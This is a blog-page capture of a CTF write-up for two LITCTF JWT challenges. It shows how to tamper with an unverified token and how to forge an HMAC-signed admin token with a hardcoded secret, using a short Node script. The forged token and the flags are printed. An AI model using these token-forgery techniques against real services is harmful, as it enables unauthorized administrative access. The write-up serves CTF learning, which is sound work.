@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Exploiting JSON Web Tokens">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JWT">
+<meta property="og:url" content="https://rivers.sh/posts/jwt/index.html">
+<meta property="og:site_name" content="Rivers">
+<meta property="og:description" content="Exploiting JSON Web Tokens">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/getflag.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/unauthorized.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/unauthorized.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/intercept.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/burpsuite.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/cookies.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/jwtio.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/jwtpayload.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-1/newjwt.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-2/challenge.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-2/unauthorized.png">
+<meta property="og:image" content="https://rivers.sh/images/JWT-2/flag.png">
+<meta property="article:published_time" content="2024-08-13T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-15T22:48:32.410Z">
+<meta property="article:author" content="Rivers">
+<meta property="article:tag" content="Web Exploitation">
+<meta property="article:tag" content="JSON">
+<meta property="article:tag" content="Easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rivers.sh/images/JWT-1/getflag.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JWT</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/VNE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/sillygoose/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/jwt/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/jwt/&text=JWT"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/jwt/&is_video=false&description=JWT"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JWT&body=Check out this article: https://rivers.sh/posts/jwt/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/jwt/&title=JWT"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/jwt/&name=JWT&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/jwt/&t=JWT"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT-1"><span class="toc-number">1.</span> <span class="toc-text">JWT-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-what-a-JWT-is"><span class="toc-number">1.2.</span> <span class="toc-text">Understanding what a JWT is</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">1.3.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-there%E2%80%A6"><span class="toc-number">1.4.</span> <span class="toc-text">Getting there…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.5.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT-2"><span class="toc-number">2.</span> <span class="toc-text">JWT-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info-1"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">2.2.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trying-the-first-solution"><span class="toc-number">2.3.</span> <span class="toc-text">Trying the first solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Inspecting-the-attached-TypeScript-file"><span class="toc-number">2.4.</span> <span class="toc-text">Inspecting the attached TypeScript file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.5.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JWT
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rivers</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-13T04:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/LITCTF/">LITCTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Easy/" rel="tag">Easy</a>, <a class="p-category" href="/tags/JSON/" rel="tag">JSON</a>, <a class="p-category" href="/tags/Web-Exploitation/" rel="tag">Web Exploitation</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">Exploiting JSON Web Tokens</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="JWT-1"><a href="#JWT-1" class="headerlink" title="JWT-1"></a>JWT-1</h1><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p><code>I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.</code></p>
+<h2 id="Understanding-what-a-JWT-is"><a href="#Understanding-what-a-JWT-is" class="headerlink" title="Understanding what a JWT is"></a>Understanding what a JWT is</h2><p>The link that I’m given for this challenge is <code>http://litctf.org:31781/</code>. Before even messing with it though, I googled “JWT” to get some further context.</p>
+<p>I found <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/JSON_web_Token">this</a> Wikipedia page. The quick summary, however, is this:</p>
+<p><code>JSON Web Token is a proposed Internet standard for creating data with optional signature and/or optional encryption whose payloads holds JSON that asserts some number of claims. The tokens are signed either using a private secret or a public/private key.</code></p>
+<h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>Next, I visited the link, where I was greeted with this:</p>
+<p><img src="/images/JWT-1/getflag.png" alt="Default page for the site"></p>
+<p>Naturally, my first response was to hit the giant button that screams “GET FLAG”. This obviously didn’t provide anything (that’d be too easy, and that’s no fun).</p>
+<p><img src="/images/JWT-1/unauthorized.png" alt="unauthorized screen"></p>
+<p>Then, I want back to the “Log in” page, and decided to log in with the user <code>admin</code> and the password <code>admin</code>, since alot of bad sites will use these as the default. This didn’t work though, and I started to just try a bunch of different combinations, but each returned the same result:</p>
+<p><img src="/images/JWT-1/unauthorized.png" alt="login screen"></p>
+<h2 id="Getting-there…"><a href="#Getting-there…" class="headerlink" title="Getting there…"></a>Getting there…</h2><p>Finally realizing this challenge wouldn’t be <strong>THAT</strong> easy, I opened up <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Burp_Suite">Burp Suite</a> to try and map out the site (maybe there’s a hidden directory!).</p>
+<p>I couldn’t find any hidden directories though, so I altered my approach, instead of trying to map out the site, I tried intercepting through Burpsuite.</p>
+<p><img src="/images/JWT-1/intercept.png" alt="intercept on burpsuite"></p>
+<p>Mostly, it looked like a normal site, but one thing did catch my eye- a cookie with the value of <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIiwiYWRtaW4iOmZhbHNlfQ.0Pi%2FH9Rz7ylX%2FM1MwPS469hjUu3b9gV0%2Fl8EW6roQC0</code>:</p>
+<p><img src="/images/JWT-1/burpsuite.png" alt="burpsuite screenshot"></p>
+<p>This immediately led me to think: “Can I manipulate this token to get admin?..” So, I went back to the “GET FLAG” screen, and decided to inspect element to take a look at the cookies:</p>
+<p><img src="/images/JWT-1/cookies.png" alt="cookies"></p>
+<p>For awhile, I messed with the <code>value</code> field. I tried changing it to <code>admin</code>, <code>123</code>, etc. Eventually, the correlation struck me- the “value” is actually a JWT (JSON Web Token)</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>One of the first results when googling “JWT” is a site called <a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a>. This site lets us decode and modify JWT tokens, so it’s crucial to beating the challenge:</p>
+<p><img src="/images/JWT-1/jwtio.png" alt="jwt.io"></p>
+<p>I decided to put the token I had into the “Encoded” field, and noticed that the information in the “PAYLOAD” field reflected the login credentials I had tried earlier.</p>
+<p><img src="/images/JWT-1/jwtpayload.png" alt="payloads"></p>
+<p>From there, I tried modifying the “admin” value from <code>false</code> to <code>true</code>, and noticed that the encoded field automatically updated to reflect the changes.</p>
+<p><img src="/images/JWT-1/newjwt.png" alt="new token"></p>
+<p>Then, I went back to Burpsuite intercept, and replaced the old  cookie token with the <strong>NEW</strong> token (which is the same token, but with we modified <code>admin: true</code>), which for me was. I hit “forward”, and got the flag.</p>
+<p>flag: <code>LITCTF&#123;o0ps_forg0r_To_v3rify_1re4DV9&#125;</code></p>
+<h1 id="JWT-2"><a href="#JWT-2" class="headerlink" title="JWT-2"></a>JWT-2</h1><h2 id="Challenge-Info-1"><a href="#Challenge-Info-1" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p><code>its like jwt-1 but this one is harder. URL: http://litctf.org:31777/</code></p>
+<p>attached: <a target="_blank" rel="noopener" href="https://drive.google.com/uc?export=downloads&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts">index.ts</a></p>
+<p><img src="/images/JWT-2/challenge.png" alt="JWT-2"></p>
+<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>While this <em>is</em> a separate challenge, its fundamentals are heavily derived from the <a href="/posts/jwt1">first</a> JWT challenge, which I heavily recommend you read first.</p>
+<h2 id="Trying-the-first-solution"><a href="#Trying-the-first-solution" class="headerlink" title="Trying the first solution"></a>Trying the first solution</h2><p>Since this is a continuation of the <strong>first</strong> JWT challenge, I figured I’d try the same solution. A quick recap on how I beat the first one:</p>
+<ol>
+<li>Register an account on the given site</li>
+<li>Use Burpsuite intercept to capture the JWT associated with our account</li>
+<li>Use <a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a> to read the contents of our JWT</li>
+<li>Modify <code>admin</code> so that it equals to <code>true</code></li>
+<li>Access the “GET FLAG” button with our <strong>new</strong> JWT and acquire flag</li>
+</ol>
+<p>For this challenge, while I <strong>was</strong> able to capture the JWT token and modify it to have <code>admin</code> set to <code>true</code>, upon actually using it, I was greeted with this:</p>
+<p><img src="/images/JWT-2/unauthorized.png" alt="unauthorized"></p>
+<h2 id="Inspecting-the-attached-TypeScript-file"><a href="#Inspecting-the-attached-TypeScript-file" class="headerlink" title="Inspecting the attached TypeScript file"></a>Inspecting the attached TypeScript file</h2><p>By now, I realized this challenge wouldn’t be as simple as the last one, so I decided to skim through the attached TypeScript file, which I’ll leave down below:</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> cookieParser <span class="keyword">from</span> <span class="string">&quot;cookie-parser&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&quot;fs&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> crypto <span class="keyword">from</span> <span class="string">&quot;crypto&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">accounts</span>: [<span class="built_in">string</span>, <span class="built_in">string</span>][] = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwtSecret = <span class="string">&quot;xook&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwtHeader = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">alg</span>: <span class="string">&quot;HS256&quot;</span>, <span class="attr">typ</span>: <span class="string">&quot;JWT&quot;</span> &#125;),</span><br><span class="line">  <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">)</span><br><span class="line">  .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params"><span class="attr">payloads</span>: <span class="built_in">object</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> signature = crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, jwtSecret).<span class="title function_">update</span>(jwtHeader + <span class="string">&#x27;.&#x27;</span> + jwtPayloads).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;server up on http://localhost:&quot;</span> + port.<span class="title function_">toString</span>())</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;site&quot;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">token</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no auth&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="comment">// split up token</span></span><br><span class="line">    <span class="keyword">const</span> [header, payloads, signature] = token.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!header || !payloads || !signature) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Buffer</span>.<span class="title function_">from</span>(header, <span class="string">&quot;base64&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="comment">// decode payloads</span></span><br><span class="line">    <span class="keyword">const</span> decodedPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(payloads, <span class="string">&quot;base64&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="comment">// parse payloads</span></span><br></pre></td></tr></table></figure>
+<p>Just to highlight what this code does:</p>
+<p><code>const [header, payloads, signature] = token.split(&quot;.&quot;);</code></p>
+<ul>
+<li>splits the JWT token into its three parts; header, payloads, and signature, and the <code>.</code> acts as a delimiter.</li>
+</ul>
+<p><code>if (!req.cookies.token)</code></p>
+<ul>
+<li>checks if the token is missing, and responds with <code>403 Unauthorized</code> if it is.</li>
+</ul>
+<p><code>Buffer.from(header,&quot;base64&quot;).toString()</code> <code>Buffer.from(payloads,&quot;base64&quot;).toString()</code></p>
+<ul>
+<li>The header and payloads are decoded from base64 to their original string format.</li>
+</ul>
+<p>However, what’s really making us hit our head is the following:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params">payloads: object</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> signature = crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, jwtSecret).<span class="title function_">update</span>(jwtHeader + <span class="string">&#x27;.&#x27;</span> + jwtPayloads).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br></pre></td></tr></table></figure>
+
+<p>This removes the <code>=</code> characters from both the base64-encoded payloads and signature. This is normal in JWTs though, and doesn’t affect the token’s validity. The main issue here isn’t the removal of padding, but making sure that the token <strong>we</strong> craft adheres to this format.</p>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>The payloads that I came up with:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwtSecret = <span class="string">&quot;xook&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwtHeader = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">alg</span>: <span class="string">&quot;HS256&quot;</span>, <span class="attr">typ</span>: <span class="string">&quot;JWT&quot;</span> &#125;),</span><br><span class="line">  <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">)</span><br><span class="line">  .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params">payloads</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> signature = crypto</span><br><span class="line">    .<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, jwtSecret)</span><br><span class="line">    .<span class="title function_">update</span>(jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = &#123; <span class="attr">name</span>: <span class="string">&quot;your_username&quot;</span>, <span class="attr">admin</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> forgedToken = <span class="title function_">sign</span>(payloads);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(forgedToken); <span class="comment">// This is the token you will use.</span></span><br></pre></td></tr></table></figure>
+
+<p>This payloads creates a token using the <code>xook</code> secret, modifies <code>admin</code> to <code>true</code>, and removes all padding (<code>=</code> characters).</p>
+<p>Then, I replaced the old token in Burpsuite intercept with the new one: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoieW91cl91c2VybmFtZSIsImFkbWluIjp0cnVlfQ.xwxnk5ogziOC8xlMNuolHBuQDbefnLA9rATCeS7fS+s</code>, and hit “forward”.</p>
+<p><img src="/images/JWT-2/flag.png" alt="flag"></p>
+<p>flag: <code>LITCTF&#123;v3rifyed_thI3_Tlme_1re4DV9&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
